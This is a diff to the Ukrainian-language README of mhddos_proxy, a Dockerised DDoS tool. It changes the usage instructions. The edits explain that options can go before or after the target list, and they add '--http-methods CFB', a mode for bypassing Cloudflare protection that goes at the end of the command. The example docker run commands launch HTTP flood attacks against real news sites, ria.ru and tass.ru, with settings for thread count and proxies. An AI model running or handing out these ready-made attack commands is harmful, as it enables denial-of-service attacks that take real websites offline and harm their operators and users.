@@ -51,7 +51,7 @@
 
 ### Налаштування
 
-**УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ**
+**УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ**, можна вказувати і до і після переліку цілей
 
 Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - 100 * ядра CPU
 
@@ -69,10 +69,11 @@
 
     docker run -it --rm portholeascend/mhddos_proxy -p 600 https://ria.ru https://tass.ru
 
-Обрати метод(и) для HTTP(S) атаки (наприклад для обходу Cloudflare) - повний
-список [див. тут](https://github.com/MHProDev/MHDDoS#features-and-methods)
+Обрати метод(и) для HTTP(S) атаки (наприклад для обходу Cloudflare) - `--http-methods CFB`  
+**Цей параметр тільки в кінці** команди  
+Повний список [див. тут](https://github.com/MHProDev/MHDDoS#features-and-methods)
 
-    docker run -it --rm portholeascend/mhddos_proxy --http-methods CFB https://ria.ru https://tass.ru
+    docker run -it --rm portholeascend/mhddos_proxy https://ria.ru https://tass.ru --http-methods CFB
 
 ## Документація
 
